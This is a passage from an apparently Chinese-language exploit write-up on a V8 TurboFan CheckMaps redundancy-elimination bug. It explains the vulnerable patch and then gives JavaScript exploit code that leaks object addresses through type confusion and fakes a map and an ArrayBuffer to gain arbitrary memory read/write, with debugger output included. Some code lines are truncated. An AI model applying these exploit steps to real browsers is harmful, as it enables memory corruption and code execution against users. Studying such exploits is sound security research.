            c32 += c16 >>> 16;
            c16 &= 0xFFFF;
            c32 += a32 + b32;
            c48 += c32 >>> 16;
            c32 &= 0xFFFF;
            c48 += a48 + b48;
            c48 &= 0xFFFF;
            return new _u64((c48 > 8) & 0xFF00) | ((val >> 24) & 0xFF);
         }
         bswap() {
            var lo = swap32(this.lo_);
            var hi = swap32(this.hi_);
            return new _u64(lo, hi);
         };
      }
    var u64 = function(hi, lo) { return new _u64(hi,lo) };
    function gc(){
        for (var i = 0; i opcode() == IrOpcode::kCheckInternalizedString &&
             b->opcode() == IrOpcode::kCheckString) {
           // CheckInternalizedString(node) implies CheckString(node)
    +    } else if (a->opcode() == IrOpcode::kCheckMaps &&
    +               b->opcode() == IrOpcode::kCheckMaps) {
    +      // CheckMaps are compatible if the first checks a subset of the second.
    +      ZoneHandleSet const& a_maps = CheckMapsParametersOf(a->op()).maps();
    +      ZoneHandleSet const& b_maps = CheckMapsParametersOf(b->op()).maps();
    +      if (!b_maps.contains(a_maps)) {
    +        return false;
    +      }
         } else {
           return false;
         }
每一个对象都有一个map来标记这个对象的类型，而checkmap就是用来检查这个对象的类型有没有变化的。  
如果没变的话就可以一直走fast path，否则就要baliout。  
根据给出的含漏洞的patch可知,JIT优化中的函数调用层次如下：
    Reduction RedundancyElimination::Reduce(Node* node) {
      if (node_checks_.Get(node)) return NoChange();
      switch (node->opcode()) {
        case IrOpcode::kCheckMaps:
        ...
          return ReduceCheckNode(node);
    -->
    Reduction RedundancyElimination::ReduceCheckNode(Node* node) {
      Node* const effect = NodeProperties::GetEffectInput(node);
      EffectPathChecks const* checks = node_checks_.Get(effect);
      // If we do not know anything about the predecessor, do not propagate just yet
      // because we will have to recompute anyway once we compute the predecessor.
      if (checks == nullptr) return NoChange();
      // See if we have another check that dominates us.
      if (Node* check = checks->LookupCheck(node)) {
        ReplaceWithValue(node, check);
        return Replace(check);
      }
    -->
    Node* RedundancyElimination::EffectPathChecks::LookupCheck(Node* node) const {
      for (Check const* check = head_; check != nullptr; check = check->next) {
        if (IsCompatibleCheck(check->node, node)) {
          DCHECK(!check->node->IsDead());
          return check->node;
        }
      }
      return nullptr;
    }
    -->
    bool IsCompatibleCheck(Node const* a, Node const* b) {
      if (a->op() != b->op()) {
        ...
        } else if (a->opcode() == IrOpcode::kCheckMaps &&
                   b->opcode() == IrOpcode::kCheckMaps) {
          // CheckMaps are compatible if the first checks a subset of the second.
          ZoneHandleSet const& a_maps = CheckMapsParametersOf(a->op()).maps();
          ZoneHandleSet const& b_maps = CheckMapsParametersOf(b->op()).maps();
          if (!b_maps.contains(a_maps)) {
            return false;
          }
        } else {
          return false;
        }
      }
      ...
      return true;
    }
首先在Reduce里遇到CheckMaps的时候
    case IrOpcode::kCheckMaps:
        ...
          return ReduceCheckNode(node);
为了找到最优的dominates，会去遍历其他的check
    for (Check const* check = head_; check != nullptr; check = check->next) {
如果找到其他的CheckMaps的话，会检查是否“兼容”，会去看它们的maps，如果第一个检查已经包含第二个检查的话，就会把第二个检查给去掉。
    if (Node* check = checks->LookupCheck(node)) {
        ReplaceWithValue(node, check);
        ...
        Node* RedundancyElimination::EffectPathChecks::LookupCheck(Node* node) const {
            if (IsCompatibleCheck(check->node, node)) {
                DCHECK(!check->node->IsDead());
                return check->node;
            }
### 利用思路
type
confusion可以让我们得到对于用户空间任何object的读写权限，可以将任意一个对象的指针当成一个double读出来，也可以将任意一个double当成一个对象的指针写进去，这样我们就可以在一个地址伪造一个对象。
通过type confusion去fake map，fake
ArrayBuffer，然后通过改我们fake的ArrayBuffer的BackingStore得到任意地址读写的原语。
### fake map prototype&&constructor
**PS.事实上这步可能不需要。只是当时学习别人exp的时候写的**  
通过type confusion去leak
ab的prototype地址，且由于prototype和constructor的地址偏移是固定的，所以可以去通过prototype的地址去计算出constructor的地址，然后将他们写入我们要fake的map对应的位置。  
不过也可以直接用`ab.__proto__.constructor`得到constructor的地址。
    var ab=new ArrayBuffer(0x20);
    // print("float is " + (new Int64(0x001900c60f00000a)).asDouble().toString());
    // print("float is " + (new Int64(0x00000000082003ff)).asDouble().toString());
    arr0=[1.1,2.2,3.3,4.4];
    // leak arraybuffer的prototype和constructor
    function read_obj_addr(object){
        function evil_r0() {
            arr0[0] = object;
        }
        for (var i = 0; i 
     - constructor: 0x34f96880b609 
     ...
     ...
    34f96880b7b9
    34f96880b609
### fake map并leak出来
前后两次gc()，让ab_map_obj这个double array移动到old space里，并且让其和它的elements地址偏移恒定。
    gc();
    gc();
    var ab_map_obj = [
        -1.1263976280432204e+129,   //0xdaba0000daba0000，写死即可，这个数字应该无所谓
        3.477098183419809e-308,     //这里是固定的标志位，直接打印一个ArrayBuffer，把对应于map这个位置的标志位用对应的double number写进去即可
        6.73490047e-316,            //这里是固定的标志位，直接打印一个ArrayBuffer，把对应于map这个位置的标志位用对应的double number写进去即可
        -1.1263976280432204e+129,   // use prototype replace it
        -1.1263976280432204e+129,   // use constructor replace it
        0.0
    ];
    gc();
    gc();
    DebugPrint: 0x3e0338a149e9: [JSArray] in OldSpace
    ...
    ...
     - elements = 0x3e0338a14a49  {
               0: -1.1264e+129
               1: 3.4771e-308
               2: 6.7349e-316
             3-4: -1.1264e+129
               5: 0
     }
    我们要fake的map在elements里，而elements的前面0x10分别是map和length，所以
    0x3e0338a14a49 + 0x10 -0x3e0338a149e9 = 0x70
    ...
    ...
    gdb-peda$ x/20gx 0x3e0338a14a49-1
    0x3e0338a14a48: 0x000037d6d7302de1  0x0000000600000000
    0x3e0338a14a58: 0xdaba0000daba0000  0x001900c60f00000a
    0x3e0338a14a68: 0x00000000082003ff  0xdaba0000daba0000
    0x3e0338a14a78: 0xdaba0000daba0000  0x0000000000000000
    0x3e0338a14a88: 0x000037d6d7302201  0x0006b57800000000
然后将其ab_map_obj的地址leak出来，加上0x70就是我们fake的map的地址。
    print("要leak出ab_map_obj的数组");
    %DebugPrint(ab_map_obj);
    // leak ab_map_obj的地址
    arr1=[1.1,2.2,3.3,4.4];
    function read_obj_addr1(object){
        function evil_r1() {
            arr1[0] = object;
        }
        for (var i = 0; i < 100000; i++) {
            trigger(arr1, function() {})
        }
        re=Int64.fromDouble(trigger(arr1,evil_r1));
        // while(1);
        return re;
    }
    ab_map_obj_addr = parseInt(read_obj_addr1(ab_map_obj))+0x70;
    print(ab_map_obj_addr.toString(16));
    ab_map_obj_addr = new Int64(ab_map_obj_addr).asDouble();
这里顺便说一句，无论是leak还是fake的时候，得到的都是double，写入的也是按照double写入，这个调试一下就知道了。
### fake ArrayBuffer并leak出来
在map被fake好了之后，我们就可以fake ArrayBuffer得到任意地址读写的原语了。  
依然是前后两次gc()，然后fake一个ArrayBuffer结构。
    gc();
    gc();
    var fake_ab = [
        ab_map_obj_addr, //我们fake的map地址
        ab_map_obj_addr, //写死即可，这个数字应该无所谓
        ab_map_obj_addr, //写死即可，这个数字应该无所谓
        3.4766779039175e-310, /* buffer length 0x4000*/
        3.477098183419809e-308,//backing store,先随便填一个数
        3.477098183419809e-308 //写死即可，这个数字应该无所谓
    ];
    gc();
    gc();
然后将这个fake好的ArrayBuffer的地址leak出来，依然是先leak
fake_ab这个JSArray的地址，然后根据偏移0x70找到我们在elements里fake的ArrayBuffer的地址。
    arr2=[1.1,2.2,3.3,4.4];
    function read_obj_addr2(object){